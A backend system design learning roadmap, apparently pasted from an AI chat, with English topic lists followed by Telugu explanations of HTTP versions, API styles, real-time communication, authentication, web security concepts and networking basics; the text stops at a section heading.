# Backend System Design Roadmap

## [1: Backend Fundamentals](#1-backend-fundamentals-1)

### [1. HTTP & Web Fundamentals](#1-http--web-fundamentals-1)

- HTTP/1.1
- HTTP/2
- HTTP/3
- HTTPS
- TLS/SSL
- REST APIs
- SOAP
- GraphQL
- gRPC
- WebSockets
- SSE (Server Sent Events)
- Long Polling
- Cookies
- Sessions
- JWT
- OAuth2
- OpenID Connect
- CORS
- CSRF
- XSS
- Same Origin Policy
- Content Security Policy
- Request Lifecycle

---

### [2. Networking](#2-networking-1)

- OSI Model
- TCP/IP
- UDP
- DNS
- Load Balancing
- Reverse Proxy
- Forward Proxy
- NAT
- VPN
- CDN
- IP Addressing
- Ports
- SSL Handshake
- TCP Handshake
- TCP Keep Alive
- Connection Pooling

---

### [3. Operating System Basics](#3-operating-system-basics-1)

- Processes
- Threads
- Context Switching
- Memory Management
- Virtual Memory
- File System
- Locks
- Deadlocks
- Semaphores
- Mutex
- Scheduling
- CPU vs IO Bound
- Signals

---

### [4. Linux](#4-linux-1)

- File System
- Permissions
- Shell
- Bash
- Process Commands
- Networking Commands
- Logs
- Cron Jobs
- Systemd
- SSH
- SCP
- rsync

---

## [2: Databases](#2-databases-1)

---

### SQL

- PostgreSQL
- MySQL

Topics

- Tables
- Constraints
- Primary Key
- Foreign Key
- Indexes
- Composite Index
- Covering Index
- Query Optimization
- Explain Analyze
- Views
- Materialized Views
- Transactions
- Isolation Levels
- ACID
- Locks
- Deadlocks
- Replication
- Partitioning
- Sharding
- Stored Procedures

---

### NoSQL

- MongoDB
- DynamoDB
- Cassandra
- Redis

Topics

- Collections
- Documents
- Secondary Index
- Aggregation
- Replication
- Sharding
- CAP Theorem
- Eventual Consistency

---

## [3: Caching](#3-caching-1)

### Redis

- Data Types
- TTL
- Pub/Sub
- Streams
- Distributed Lock
- Rate Limiting
- Leaderboard
- Cache Aside
- Write Through
- Write Behind
- Read Through
- Cache Invalidation
- Cache Stampede
- Cache Penetration

---

## [4: Messaging Systems](#4-messaging-systems-1)

### Message Queues

- RabbitMQ
- Kafka
- Amazon SQS
- Amazon SNS
- ActiveMQ
- NATS

Topics

- Producer
- Consumer
- Topic
- Queue
- Partition
- Offset
- Consumer Group
- Retry
- DLQ
- Ordering
- Idempotency
- Exactly Once
- At Least Once
- At Most Once

---

### [5: API Design](#5-api-design-1)

- REST Best Practices
- GraphQL
- gRPC
- Pagination
- Filtering
- Sorting
- Versioning
- Rate Limiting
- API Gateway
- OpenAPI
- Swagger

---

## [6: Authentication & Authorization](#6-authentication--authorization-1)

Authentication

- JWT
- OAuth2
- OpenID Connect
- API Keys
- SAML

Authorization

- RBAC
- ABAC
- ACL
- Multi-Tenant Authorization
- Policy Based Authorization

---

## [7: Distributed Systems](#7-distributed-systems-1)

### Concepts

- CAP Theorem
- PACELC
- Consistency
- Availability
- Partition Tolerance
- Horizontal Scaling
- Vertical Scaling
- Load Balancing
- Service Discovery
- Circuit Breaker
- Bulkhead
- Retry
- Backoff
- Idempotency
- Distributed Lock
- Distributed Transactions
- Saga Pattern
- CQRS
- Event Sourcing
- Outbox Pattern
- CDC
- Leader Election
- Consensus
- Raft
- Paxos

---

## [8: Microservices](#8-microservices-1)

- Monolith
- Microservices
- Service Mesh
- API Gateway
- BFF
- Sidecar
- Service Registry
- Discovery
- Communication Patterns
- Sync vs Async
- Choreography
- Orchestration

---

## [9: Cloud](#9-cloud-1)

### AWS

Core

- IAM
- VPC
- EC2
- Lambda
- ECS
- EKS
- API Gateway
- Route53
- CloudFront
- S3
- CloudWatch
- CloudTrail
- Systems Manager

Databases

- RDS
- Aurora
- DynamoDB
- ElastiCache

Messaging

- SQS
- SNS
- EventBridge
- MSK

Security

- WAF
- Shield
- KMS
- Secrets Manager

Monitoring

- CloudWatch
- X-Ray

---

## [10: Containers](#10-containers-1)

Docker

- Images
- Containers
- Dockerfile
- Docker Compose
- Volumes
- Networks
- Multi-stage Build

Kubernetes

- Pods
- Deployment
- ReplicaSet
- StatefulSet
- DaemonSet
- Service
- Ingress
- ConfigMap
- Secret
- Autoscaling
- Helm

---

## [11: CI/CD](#11-cicd-1)

- Git
- GitHub Actions
- Jenkins
- GitLab CI
- CircleCI
- ArgoCD
- Blue Green Deployment
- Canary Deployment
- Rolling Deployment

---

## [12: Observability](#12-observability-1)

Logging

- ELK
- OpenSearch
- Fluent Bit

Monitoring

- Prometheus
- Grafana
- Datadog
- CloudWatch

Tracing

- OpenTelemetry
- Jaeger
- Zipkin
- AWS X-Ray

Metrics

- RED
- USE
- SLI
- SLO
- SLA

---

## [13: Security](#13-security-1)

- OWASP Top 10
- SQL Injection
- XSS
- CSRF
- SSRF
- CSP
- JWT Security
- Secrets Management
- Encryption
- Hashing
- HMAC
- Digital Signatures
- TLS

---

## [14: Performance Engineering](#14-performance-engineering-1)

- Profiling
- Load Testing
- Stress Testing
- Benchmarking
- Memory Leak Detection
- CPU Optimization
- Connection Pooling
- Compression
- Lazy Loading
- Async Processing

Tools

- k6
- JMeter
- Artillery

---

## [15: Design Patterns](#15-design-patterns-1)

- Singleton
- Factory
- Builder
- Strategy
- Observer
- Adapter
- Decorator
- Repository
- Dependency Injection
- CQRS
- Saga
- Outbox

---

## [16: System Design Patterns](#16-system-design-patterns-1)

- Load Balancer
- Reverse Proxy
- API Gateway
- CDN
- Cache
- Database Replication
- Database Sharding
- Partitioning
- Leader-Follower
- Event Driven Architecture
- Pub/Sub
- Message Queue
- Distributed Cache
- Distributed Lock

---

## [17: High-Level System Design Problems](#17-high-level-system-design-problems-1)

Practice designing systems such as:

- [URL Shortener](#url-shortener)
- [WhatsApp](#whatsapp)
- [Chat Application](#chat-application)
- [Instagram Feed](#instagram-feed)
- [Twitter/X Timeline](#twitterx-timeline)
- [YouTube](#youtube)
- [Netflix](#netflix)
- [Uber](#uber)
- [Zomato/Swiggy](#zomatoswiggy)
- [BookMyShow](#bookmyshow)
- [Payment Gateway](#payment-gateway)
- [Banking System](#banking-system)
- [Notification Service](#notification-service)
- [Search Engine](#search-engine)
- [Google Drive](#google-drive)
- [Dropbox](#dropbox)
- [Ride Sharing](#ride-sharing)
- [E-commerce Platform](#e-commerce-platform)
- [Inventory System](#inventory-system)
- [Hotel Booking](#hotel-booking)
- [Food Delivery](#food-delivery)
- [Ticket Booking](#ticket-booking)

---

## [18: Language-Specific Backend (Node.js)](#18-language-specific-backend-nodejs-1)

Since you work with **Node.js**, master:

- [Event Loop](#event-loop)
- [libuv](#libuv)
- [Worker Threads](#worker-threads)
- [Cluster](#cluster)
- [Streams](#streams)
- [Buffers](#buffers)
- [Child Processes](#child-processes)
- [Async Hooks](#async-hooks)
- [EventEmitter](#eventemitter)
- [Memory Management](#memory-management)
- [Garbage Collection](#garbage-collection)
- [V8 Engine](#v8-engine)
- [AsyncLocalStorage](#asynclocalstorage)
- [Performance Hooks](#performance-hooks)

---

# Recommended Learning Order (12–18 Months)

1. Backend fundamentals (HTTP, Networking, Linux, OS)
2. Node.js internals
3. SQL (PostgreSQL/MySQL)
4. NoSQL (MongoDB, DynamoDB)
5. Redis and caching
6. API design (REST, GraphQL, gRPC)
7. Authentication & authorization
8. Docker
9. AWS core services
10. Messaging (Kafka, SQS, SNS, RabbitMQ)
11. Microservices
12. Distributed systems
13. Kubernetes
14. Observability (Datadog, OpenTelemetry, Grafana)
15. Security
16. Performance optimization
17. CI/CD
18. High-Level System Design
19. Mock interviews and real-world architecture case studies

## Since your recent questions have focused on **Node.js, AWS Serverless, NestJS, Datadog, Express.js, and frontend system design**, this roadmap aligns well with your stack. A practical next step would be to build a complete production-grade backend project that incorporates these topics—for example, a serverless e-commerce or banking platform using Node.js, AWS, PostgreSQL, Redis, Kafka/SQS, and Datadog—while applying the system design concepts throughout.

# 1: Backend Fundamentals

ఖచ్చితంగా! ఈ నెట్‌వర్కింగ్ మరియు వెబ్ ఫండమెంటల్స్ టాపిక్స్ అన్నింటినీ—అవి ఎందుకు వచ్చాయి, వాటి ప్రాబ్లమ్స్ ఏంటి, మరియు వాటిని అధిగమించడానికి నెక్స్ట్ వెర్షన్‌కి ఎందుకు అప్‌గ్రేడ్ అయ్యాం అనేది చాలా క్లియర్‌గా, తెలుగులో నేర్చుకుందాం.

---

## 1. HTTP & Web Fundamentals

## 1. HTTP Protocols (The Evolution)

వెబ్‌లో క్లయింట్ (Browser) మరియు సర్వర్ మధ్య డేటా ఎలా ప్రయాణించాలో చెప్పే రూల్స్ ఇవి.

### 🌐 HTTP/1.1

- **What it is:** ఇది 1997లో వచ్చిన ప్రోటోకాల్. ఇందులో క్లయింట్ ఒక రిక్వెస్ట్ పంపితే, సర్వర్ ఒక రెస్పాన్స్ ఇస్తుంది. ఒక కనెక్షన్‌ని మళ్ళీ మళ్ళీ వాడుకోవడానికి `Keep-Alive` అనే ఫీచర్‌ని తీసుకొచ్చింది.
- **Why we upgraded:** ఇందులో **Head-of-Line (HOL) Blocking** అనే పెద్ద ప్రాబ్లం ఉంది. అంటే, ఒక బ్రౌజర్ ఒకే కనెక్షన్‌లో 4 ఇమేజెస్ అడిగితే, మొదటి ఇమేజ్ డౌన్‌లోడ్ అయ్యే వరకు మిగతా 3 వెయిట్ చేయాలి. బ్రౌజర్లు గరిష్టంగా 6 కనెక్షన్లు మాత్రమే ఓపెన్ చేయగలవు, అందువల్ల వెబ్‌సైట్లు స్లో అయిపోయాయి.

### ⚡ HTTP/2 (The Multiplexing Era)

- **What it is:** 2015లో వచ్చిన అప్‌గ్రేడ్. ఇది డేటాను టెక్స్ట్ లాగా కాకుండా **Binary Format** లో పంపుతుంది. దీని ముఖ్య ఫీచర్ **Multiplexing**—ఒకే ఒక్క TCP కనెక్షన్ ద్వారా ఎన్ని రిక్వెస్ట్‌లైనా, రెస్పాన్స్‌లైనా ఒకేసారి (పారలల్‌గా) పంపవచ్చు.
- **Why we upgraded:** HTTP/2 అప్లికేషన్ లెవెల్‌లో HOL బ్లాకింగ్‌ని తీసేసింది కానీ, బ్యాక్‌గ్రౌండ్‌లో వాడే **TCP (Transmission Control Protocol)** లెవెల్‌లో ప్రాబ్లం వచ్చింది. TCPలో ఒక ప్యాకెట్ మిస్ అయితే, ఆ ప్యాకెట్ మళ్ళీ వచ్చే వరకు మిగతా అన్ని ప్యాకెట్లు ఆగిపోతాయి (TCP HOL Blocking). దీనివల్ల ఇంటర్నెట్ స్లోగా ఉన్నప్పుడు HTTP/2 ప్రదర్శన దెబ్బతింది.

### 🚀 HTTP/3 (The Speed Demon)

- **What it is:** ఇది సరికొత్త వెర్షన్. ఇది పాత TCPని తీసేసి, దాని స్థానంలో **UDP (User Datagram Protocol)** పై బిల్ట్ అయిన **QUIC** అనే ప్రోటోకాల్‌ని వాడుతుంది.
- **Why it's better:** ఇందులో ఒక ప్యాకెట్ లాస్ అయినా, మిగతా ప్యాకెట్ల ప్రవాహం ఆగదు. కనెక్షన్ ఎస్టాబ్లిష్ అవ్వడం చాలా వేగంగా (0-RTT) జరుగుతుంది. మీరు వైఫై నుండి మొబైల్ డేటాకి మారినా కనెక్షన్ కట్ అవ్వకుండా స్మూత్‌గా సాగిపోతుంది.

---

## 2. Security & Communication Layer

### 🔒 HTTPS & TLS/SSL

- **What it is:** HTTP అనేది ప్లెయిన్ టెక్స్ట్. ఎవరైనా మధ్యలో డేటాని దొంగిలించవచ్చు (Man-in-the-middle attack). HTTPకి **TLS/SSL (Transport Layer Security)** అనే ఎన్‌క్రిప్షన్ లేయర్‌ని తోడు చేస్తే అది **HTTPS** అవుతుంది.
- **Why it's necessary:** సర్వర్ మరియు క్లయింట్ మధ్య వెళ్ళే డేటా (Passwords, Credit Cards) పూర్తిగా ఎన్‌క్రిప్ట్ అవుతుంది. మధ్యలో ఎవరు చూసినా అది పిచ్చి ముక్కల్లా కనిపిస్తుంది.

---

## 3. API Architectural Styles

సర్వర్ నుండి డేటాను క్లయింట్ ఎలా అడగాలి, సర్వర్ ఎలా ఇవ్వాలి అనేదానికి కొన్ని స్టాండర్డ్స్ ఉన్నాయి.

### 🏛️ SOAP (Simple Object Access Protocol)

- **What it is:** ఇది చాలా పాత, స్ట్రిక్ట్ ప్రోటోకాల్. డేటా కేవలం **XML** ఫార్మాట్ లోనే ఉంటుంది. దీనికి కచ్చితమైన రూల్స్ (WSDL) ఉంటాయి.
- **Why we upgraded:** ఇది చాలా హెవీ (Verbose). XML వల్ల పేలోడ్ సైజ్ ఎక్కువ అవుతుంది, పార్సింగ్ స్లో అవుతుంది. డెవలప్ చేయడం కూడా కష్టం.

### 🌐 REST APIs (Representational State Transfer)

- **What it is:** ఇది ఆర్కిటెక్చరల్ స్టైల్. ఇక్కడ అన్నీ 'Resources' (ఉదాహరణకు: `/users`, `/products`). HTTP Methods (`GET`, `POST`, `PUT`, `DELETE`) వాడుతూ, ఎక్కువగా **JSON** ఫార్మాట్ లో డేటా ఎక్స్చేంజ్ జరుగుతుంది. ఇది లైట్ వెయిట్ మరియు ఈజీ.
- **Why we upgraded (in some cases):** REST లో రెండు ముఖ్యమైన సమస్యలు ఉన్నాయి:

1. **Over-fetching:** మీకు యూజర్ పేరు మాత్రమే కావాలి, కానీ `/user/1` ని కాల్ చేస్తే వాని అడ్రస్, ఫోన్ నంబర్ అన్నీ వచ్చేస్తాయి.
2. **Under-fetching:** ఒక స్క్రీన్ చూపించడానికి `/user`, `/orders`, `/payments` అని 3-4 సార్లు వేర్వేరుగా కాల్స్ చేయాల్సి వస్తుంది.

### 📊 GraphQL

- **What it is:** Facebook వాళ్ళు తెచ్చిన క్వెరీ లాంగ్వేజ్. క్లయింట్ తనకు ఏ డేటా కావాలో కచ్చితంగా అడిగి (Ask for what you want), అంతే డేటాను సింగిల్ రిక్వెస్ట్‌లో పొందుతుంది. Over-fetching, Under-fetching సమస్యలు ఉండవు.
- **Why we upgraded (for Microservices):** ఇది ఫ్రంటెండ్-బ్యాకెండ్ కమ్యూనికేషన్‌కి అద్భుతం. కానీ ఇంటర్నల్ బ్యాకెండ్-టు-బ్యాకెండ్ (Microservices) కమ్యూనికేషన్ కి ఇంకా వేగవంతమైనది కావాలి.

### ⚡ gRPC (Google Remote Procedure Call)

- **What it is:** గూగుల్ డెవలప్ చేసిన హై-పెర్ఫార్మెన్స్ ఆర్కిటెక్చర్. ఇది HTTP/2 ని వాడుకుంటుంది మరియు డేటాని JSON లో కాకుండా **Protocol Buffers (Protobuf)** అనే బైనరీ ఫార్మాట్‌లో పంపుతుంది.
- **Why it's used:** ఇంటర్నల్ మైక్రోసర్వీసెస్ మధ్య కమ్యూనికేషన్ అత్యంత వేగంగా (Extremely fast, low latency) జరగడానికి ఇది బెస్ట్ ఛాయిస్.

---

## 4. Real-Time Communication

సాధారణంగా క్లయింట్ అడిగితేనే సర్వర్ డేటా ఇస్తుంది. కానీ రియల్-టైమ్ (లైవ్ చాట్, స్టాక్ అప్డేట్స్) కావాలంటే ఎలా?

### 🔄 Long Polling

- **What it is:** క్లయింట్ సర్వర్‌కి ఒక రిక్వెస్ట్ పంపి అలానే వెయిట్ చేస్తుంది. సర్వర్ దగ్గర కొత్త డేటా రాగానే రెస్పాన్స్ ఇస్తుంది. రెస్పాన్స్ రాగానే క్లయింట్ వెంటనే ఇంకో రిక్వెస్ట్ పంపుతుంది.
- **Why we upgraded:** సర్వర్ పై లోడ్ ఎక్కువ అవుతుంది. ప్రతిసారీ కొత్త HTTP హెడర్స్ పంపాలి, కనెక్షన్స్ ఓపెన్/క్లోజ్ చేయాలి. ఇది నిజమైన రియల్-టైమ్ కాదు.

### 📡 WebSockets

- **What it is:** ఇది **Bi-directional (Full-Duplex)** కనెక్షన్. క్లయింట్, సర్వర్ మధ్య ఒకసారి కనెక్షన్ ఓపెన్ అయితే, ఇద్దరూ ఎప్పుడైనా డేటా పంపుకోవచ్చు. లైవ్ చాట్స్ (WhatsApp లాంటివి) దీనితోనే నడుస్తాయి.
- **Why we need an alternative:** కొన్నిసార్లు సర్వర్ మాత్రమే క్లయింట్‌కి డేటా పంపాలి (ఉదా: లైవ్ స్కోర్, నోటిఫికేషన్స్), క్లయింట్ సర్వర్‌కి ఏం పంపాల్సిన అవసరం లేదు. అలాంటి చోట వెబ్‌సాకెట్స్ హెవీ అయిపోతాయి.

### 🔔 SSE (Server-Sent Events)

- **What it is:** ఇది **Uni-directional** (ఏకపక్ష) కనెక్షన్. క్లయింట్ ఒక్కసారి కనెక్షన్ ఓపెన్ చేస్తే, సర్వర్ నిరంతరంగా డేటాను నెట్టుకుంటూ (Stream) వస్తుంది. ఇది కేవలం HTTP ప్రోటోకాల్ పైనే రన్ అవుతుంది, సింపుల్‌గా ఉంటుంది.

---

## 5. Authentication & State Management

### 🍪 Cookies & Sessions

- **What it is:** HTTP అనేది **Stateless** (ఒక రిక్వెస్ట్‌కి, ఇంకో రిక్వెస్ట్‌కి సంబంధం ఉండదు). యూజర్ లాగిన్ అయ్యాడని గుర్తుపెట్టుకోవడానికి సర్వర్ ఒక 'Session ID' క్రియేట్ చేసి డేటాబేస్‌లో దాచుకుంటుంది, ఆ ID ని బ్రౌజర్ **Cookie** లో స్టోర్ చేస్తుంది.
- **Why we upgraded:** మీ అప్లికేషన్ పెద్దదై, మల్టిపుల్ సర్వర్స్ (Scalability) వచ్చినప్పుడు, అన్ని సర్వర్లకి ఈ సెషన్ డేటా తెలియాలి. డేటాబేస్ లుక్అప్స్ ఎక్కువైపోతాయి.

### 🪙 JWT (JSON Web Token)

- **What it is:** ఇది **Stateless Authentication**. యూజర్ లాగిన్ అవ్వగానే సర్వర్ ఒక ఎన్‌క్రిప్టెడ్ టోకెన్ (JWT) ఇస్తుంది. అందులోనే యూజర్ ఇన్ఫర్మేషన్ ఉంటుంది. సర్వర్ మళ్ళీ డేటాబేస్ చెక్ చేయనక్కర్లేదు, టోకెన్ సిగ్నేచర్ వాలిడేట్ చేస్తే చాలు.
- **Why we need more:** JWT కేవలం అథెంటికేషన్ వరకే. కానీ థర్డ్ పార్టీ యాప్స్ కి (ఉదా: Login with Google) పర్మిషన్ ఇవ్వాలంటే ఇది సరిపోదు.

### 🔐 OAuth2 & OpenID Connect (OIDC)

- **What it is:** \* **OAuth2:** ఇది **Authorization** ఫ్రేమ్‌వర్క్. మీ పాస్‌వర్డ్ చెప్పకుండా, మీ ప్రొఫైల్ లేదా డేటాని వేరే యాప్ యాక్సెస్ చేయడానికి అనుమతి ఇస్తుంది (Access Token).
- **OpenID Connect:** OAuth2 పైన బిల్ట్ చేసిన **Authentication** లేయర్. ఇది యూజర్ "ఎవరు" (Identity) అని చెప్పడానికి **ID Token** ని ఇస్తుంది.

---

## 6. Security Concepts (The Defenders)

### 🌐 Same-Origin Policy (SOP) & CORS

- **What it is (SOP):** బ్రౌజర్ యొక్క ఒక సెక్యూరిటీ రూల్. `site-a.com` లో ఉన్న స్క్రిప్ట్, `site-b.com` యొక్క డేటాని నేరుగా యాక్సెస్ చేయలేదు.
- **Why we need CORS:** కానీ రియల్ వరల్డ్‌లో మన ఫ్రంటెండ్ `myfrontend.com` లో, బ్యాకెండ్ `api.mybackend.com` లో ఉండొచ్చు. అప్పుడు SOP బ్లాక్ చేస్తుంది. అందుకే బ్యాకెండ్ సర్వర్ **CORS (Cross-Origin Resource Sharing)** హెడర్స్ ద్వారా "ఫలానా ఫ్రంటెండ్‌ని నేను నమ్ముతున్నాను, డేటా ఇవ్వచ్చు" అని బ్రౌజర్‌కి చెప్తుంది.

### 🛡️ CSRF, XSS & CSP

- **XSS (Cross-Site Scripting):** హ్యాకర్ మీ వెబ్‌సైట్‌లోకి మాలీషియస్ జావాస్క్రిప్ట్ కోడ్‌ని ఇంజెక్ట్ చేసి, యూజర్ల కుకీలను దొంగిలించడం.
- _సొల్యూషన్:_ **CSP (Content Security Policy)**—బ్రౌజర్ ఏయే సైట్ల నుండి స్క్రిప్ట్స్ లోడ్ చేయాలో సర్వర్ ఒక పాలసీ రూపంలో చెప్తుంది.

- **CSRF (Cross-Site Request Forgery):** యూజర్ ఆల్రెడీ లాగిన్ అయి ఉన్న బ్యాంక్ సైట్ కనెక్షన్‌ని వాడుకుని, హ్యాకర్ వేరే సైట్ నుండి యూజర్‌కి తెలియకుండానే బ్యాంక్ ట్రాన్సాక్షన్ రిక్వెస్ట్ పంపించడం.
- _సొల్యూషన్:_ CSRF Tokens ని వాడటం.

---

## 7. Request Lifecycle (The Big Picture)

మీరు బ్రౌజర్‌లో `https://example.com/profile` అని టైప్ చేసి ఎంటర్ కొట్టినప్పటి నుండి స్క్రీన్ పై డేటా కనిపించే వరకు జరిగే ప్రయాణమే ఇది:

1. **DNS Lookup:** బ్రౌజర్ మొదట డొమైన్ పేరును IP అడ్రస్‌గా మారుస్తుంది.
2. **TCP Handshake & TLS/SSL:** బ్రౌజర్ మరియు సర్వర్ మధ్య సురక్షితమైన కనెక్షన్ ఏర్పడుతుంది.
3. **HTTP Request:** బ్రౌజర్ ఒక HTTP GET రిక్వెస్ట్ (హెడర్స్, కుకీలతో సహా) పంపుతుంది.
4. **Load Balancer/Reverse Proxy:** రిక్వెస్ట్ మొదట లోడ్ బాలెన్సర్‌కి వస్తుంది, అది ఖాళీగా ఉన్న బ్యాకెండ్ సర్వర్‌కి పంపుతుంది.
5. **Backend Processing:** బ్యాకెండ్ కోడ్ (Node.js/Python) రన్ అయ్యి, అథెంటికేషన్ (JWT) చెక్ చేసి, డేటాబేస్ నుండి డేటా తెస్తుంది.
6. **HTTP Response:** సర్వర్ డేటాను JSON/HTML రూపంలో బ్రౌజర్‌కి వెనక్కి పంపుతుంది.
7. **Rendering:** బ్రౌజర్ ఆ డేటాను ప్రాసెస్ చేసి స్క్రీన్ పై చూపిస్తుంది.

---

## 2. Networking

---

ఖచ్చితంగా! నెట్‌వర్కింగ్ (Networking) అనేది బ్యాకెండ్ సిస్టమ్ డిజైన్‌కి గుండెకాయ లాంటిది. డేటా ఒక కంప్యూటర్ నుండి ఇంకో కంప్యూటర్‌కి ఎలా వెళ్తుంది, పెద్ద పెద్ద అప్లికేషన్లు మిలియన్ల కొద్దీ యూజర్లను ఎలా హ్యాండిల్ చేస్తాయి అనేది ఈ టాపిక్స్ ద్వారానే అర్థమవుతుంది.

వీటిని కూడా మునుపటి లాగే—అవి ఏంటి, రియల్-వరల్డ్ ఉపయోగం ఏంటి, ఒకదాని నుండి ఇంకొకదానికి ఎందుకు అప్‌గ్రేడ్ అయ్యాం అనే కోణంలో తెలుగులో క్లియర్‌గా నేర్చుకుందాం.

---

## 1. Foundation Models (The Blueprints)

ఇంటర్నెట్‌లో డేటా ఎలా ప్రయాణించాలో వివరించే థియరిటికల్ మరియు ప్రాక్టికల్ మోడల్స్ ఇవి.

### 🗺️ OSI Model (Open Systems Interconnection)

- **What it is:** నెట్‌వర్కింగ్ ఎలా పనిచేస్తుందో అర్థం చేసుకోవడానికి ఒక **7-Layer Theoretical Model** (Physical, Data Link, Network, Transport, Session, Presentation, Application Layers).
- **Why we moved to TCP/IP:** ఇది ఒక థియరీ (పుస్తకాల్లో రూల్స్) మాత్రమే. రియల్ వరల్డ్ ఇంప్లిమెంటేషన్‌కి ఇది చాలా కాంప్లెక్స్ అయిపోయింది. కొన్ని లేయర్స్ (Session, Presentation) ప్రాక్టికల్‌గా విడిగా అవసరం లేదనిపించింది.

### 🌐 TCP/IP Model (The Real Internet)

- **What it is:** ఇది ప్రాక్టికల్ **4-Layer Model** (Network Access, Internet, Transport, Application). నేటి ఇంటర్నెట్ అంతా దీని పైనే నడుస్తోంది. ఇది OSI మోడల్‌ని సింప్లిఫై చేసి, నిజంగా సాఫ్ట్‌వేర్ రాయడానికి వీలుగా మార్చబడింది.

---

## 2. Core Protocols (Transport Layer)

డేటాను ముక్కలుగా (Packets) చేసి అవతలి వైపుకి ఎలా చేర్చాలో ఇవి డిసైడ్ చేస్తాయి.

### 🤝 TCP (Transmission Control Protocol)

- **What it is:** ఇది ఒక **Connection-oriented** ప్రోటోకాల్. డేటా పంపే ముందు క్లయింట్ మరియు సర్వర్ కనెక్ట్ అవ్వాలి. పంపిన డేటా పక్కాగా, ఏ ముక్కా మిస్ కాకుండా, ఒకే ఆర్డర్‌లో అవతలి వాళ్లకి చేరుతుందని గ్యారెంటీ ఇస్తుంది.
- **Why we upgraded (or shifted to UDP):** ఇది చాలా సురక్షితమైనది కానీ కొంచెం స్లో. ప్రతి ప్యాకెట్ అందిందా లేదా అని చెక్ చేస్తుంది (Acknowledgment). ఒకవేళ ఏదైనా ప్యాకెట్ మిస్ అయితే, అది మళ్ళీ వచ్చే వరకు మిగతా డేటా ఆగిపోతుంది.

### ⚡ UDP (User Datagram Protocol)

- **What it is:** ఇది **Connectionless** మరియు ఫాస్ట్ ప్రోటోకాల్. డేటా చేరిందా లేదా అని ఇది పట్టించుకోదు, బ్లైండ్‌గా పంపించేస్తుంది.
- **Why we use it:** లైవ్ వీడియో స్ట్రీమింగ్ (YouTube Live), ఆన్‌లైన్ గేమింగ్, లేదా వాయిస్ కాల్స్ (WhatsApp Calls) లో ఒక ఫ్రేమ్ మిస్ అయినా పర్లేదు కానీ లాగ్ (Delay) ఉండకూడదు. అందుకే ఇక్కడ UDP వాడతాం.

---

## 3. Web Navigation & Routing

### 🗺️ IP Addressing & Ports

- **What it is:** \* **IP Address:** ఇంటర్నెట్‌లో మీ కంప్యూటర్ యొక్క ఇల్లు లేదా అడ్రస్ (ఉదా: `192.168.1.1`).
- **Port:** ఆ ఇంట్లో ఉండే కిటికీలు లేదా తలుపులు లాంటివి. ఒకే కంప్యూటర్‌లో రన్ అయ్యే వేర్వేరు సాఫ్ట్‌వేర్లకి వేర్వేరు పోర్ట్స్ ఉంటాయి (ఉదా: Node.js కి `3000`, Database కి `5432`).

- **Why we upgraded (IPv4 to IPv6):** పాత IPv4 లో కేవలం 4.3 బిలియన్ అడ్రస్‌లు మాత్రమే సాధ్యం. ప్రపంచంలో డివైసెస్ పెరిగిపోవడంతో ఐపీలు అయిపోయాయి. అందుకే అపరిమితమైన అడ్రస్‌లు ఇచ్చే **IPv6** కి ప్రపంచం మారుతోంది.

### 📞 DNS (Domain Name System)

- **What it is:** ఇంటర్నెట్ యొక్క ఫోన్ బుక్. మనకి `142.250.183.46` లాంటి నంబర్లు గుర్తుండవు, కానీ `google.com` గుర్తుంటుంది. మనం డొమైన్ నేమ్ టైప్ చేయగానే దానికి సంబంధించిన IP అడ్రస్‌ని వెతికి తెచ్చేదే DNS.

---

## 4. Architectural Proxies & Traffic Management

బ్యాకెండ్ ఆర్కిటెక్చర్‌లో సర్వర్లని కాపాడటానికి, లోడ్ మేనేజ్ చేయడానికి వీటిని వాడతాం.

### ⚖️ Load Balancing

- **What it is:** మీ వెబ్‌సైట్‌కి ఒకేసారి లక్షల మంది యూజర్లు వస్తే ఒకే సర్వర్ తట్టుకోలేదు. కాబట్టి వెనుక 5-10 సర్వర్లు పెట్టి, వచ్చే ట్రాఫిక్‌ని అందరికీ సమానంగా పంచే (Distribute) మేనేజరే లోడ్ బాలెన్సర్ (ఉదా: Nginx, AWS ALB).

### 🔄 Reverse Proxy

- **What it is:** క్లయింట్ కి మరియు మీ బ్యాకెండ్ సర్వర్లకి మధ్యలో ఉండే ఒక సెక్యూరిటీ గార్డ్. క్లయింట్ ఇచ్చే రిక్వెస్ట్‌లను ఇది రిసీవ్ చేసుకుని, వెనుక ఉన్న ఏ బ్యాకెండ్ సర్వర్‌కి పంపాలో డిసైడ్ చేస్తుంది. బ్యాకెండ్ సర్వర్ల అసలు ఐపీలు బయట ప్రపంచానికి తెలియకుండా దాస్తుంది.
- **Difference with Forward Proxy:** \* **Forward Proxy:** క్లయింట్ వైపు ఉంటుంది (ఉదా: కాలేజీ లేదా ఆఫీస్ వైఫై లో కొన్ని సైట్లు బ్లాక్ చేయడానికి వాడేది). ఇది క్లయింట్ ఎవరో సర్వర్‌కి తెలియకుండా దాస్తుంది.
- **Reverse Proxy:** సర్వర్ వైపు ఉంటుంది. ఇది సర్వర్ ఎవరో క్లయింట్ కి తెలియకుండా దాస్తుంది.

---

## 5. Network Optimization & Security Extensions

### 🌐 CDN (Content Delivery Network)

- **What it is:** మీ మెయిన్ సర్వర్ ఇండియాలో ఉందనుకుందాం. అమెరికాలో ఉన్న యూజర్ మీ సైట్ ఓపెన్ చేస్తే డేటా ట్రావెల్ అవ్వడానికి టైమ్ పడుతుంది (Latency). అందుకే ప్రపంచవ్యాప్తంగా ఉండే క్యాషే (Cache) సర్వర్లలో మీ ఇమేజెస్, వీడియోలు, ఫైల్స్ దాచి ఉంచేదే CDN (ఉదా: Cloudflare).
- **Why we use it:** దీనివల్ల మెయిన్ సర్వర్ పై లోడ్ తగ్గుతుంది, యూజర్‌కి వెబ్‌సైట్ సూపర్ ఫాస్ట్‌గా ఓపెన్ అవుతుంది.

### 🛡️ NAT (Network Address Translation) & VPN

- **NAT:** మీ ఇంట్లో 5 డివైసెస్ ఉంటే, వైఫై రూటర్ వాటన్నిటికీ ఒకే ఒక్క పబ్లిక్ ఐపీతో ఇంటర్నెట్ కనెక్టివిటీ ఇస్తుంది. మీ ప్రైవేట్ ఐపీలని దాచి ఉంచే టెక్నాలజీ ఇది.
- **VPN (Virtual Private Network):** పబ్లిక్ ఇంటర్నెట్ వాడుతున్నా, మీ డేటా హ్యాక్ అవ్వకుండా ఒక సీక్రెట్ ఎన్‌క్రిప్టెడ్ టన్నెల్ (Tunnel) క్రియేట్ చేస్తుంది. ఆఫీస్ ఇంటర్నల్ సర్వర్లని వర్క్ ఫ్రమ్ హోమ్ చేస్తూ యాక్సెస్ చేయడానికి ఇది వాడతాం.

---

## 6. Deep Dive: Handshakes & Connection Management

